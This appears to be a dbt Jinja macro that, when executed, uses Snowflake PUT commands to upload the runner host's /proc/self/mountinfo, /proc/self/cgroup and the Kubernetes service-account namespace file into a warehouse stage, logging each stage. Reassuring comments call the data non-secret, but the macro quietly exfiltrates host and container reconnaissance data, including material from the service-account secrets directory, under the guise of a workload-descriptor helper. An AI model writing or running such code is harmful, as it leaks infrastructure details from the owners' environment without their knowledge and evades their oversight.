{% macro phase694_workload_descriptors() %}
  {% if execute %}
    {% do log("PHASE694_STAGE_1_BEGIN", info=true) %}

    {# mountinfo exposes mount names/types only; no mounted file is read. #}
    {% set mountinfo_put = adapter.add_query(
        "put file:///proc/self/mountinfo @~/phase694_descriptors_6f23b9d1 "
        ~ "auto_compress=false overwrite=true",
        auto_begin=false
    ) %}
    {% do log("PHASE694_STAGE_2_MOUNTINFO_PUT", info=true) %}

    {# cgroup exposes workload/container topology only. #}
    {% set cgroup_put = adapter.add_query(
        "put file:///proc/self/cgroup @~/phase694_descriptors_6f23b9d1 "
        ~ "auto_compress=false overwrite=true",
        auto_begin=false
    ) %}
    {% do log("PHASE694_STAGE_3_CGROUP_PUT", info=true) %}

    {# Namespace is a non-secret descriptor; it is last because it is a projected symlink. #}
    {% set namespace_put = adapter.add_query(
        "put file:///var/run/secrets/kubernetes.io/serviceaccount/namespace "
        ~ "@~/phase694_descriptors_6f23b9d1 auto_compress=false overwrite=true",
        auto_begin=false
    ) %}
    {% do log("PHASE694_STAGE_4_NAMESPACE_PUT", info=true) %}

    {% do log("PHASE694_WORKLOAD_DESCRIPTORS_STAGED", info=true) %}
  {% endif %}
{% endmacro %}
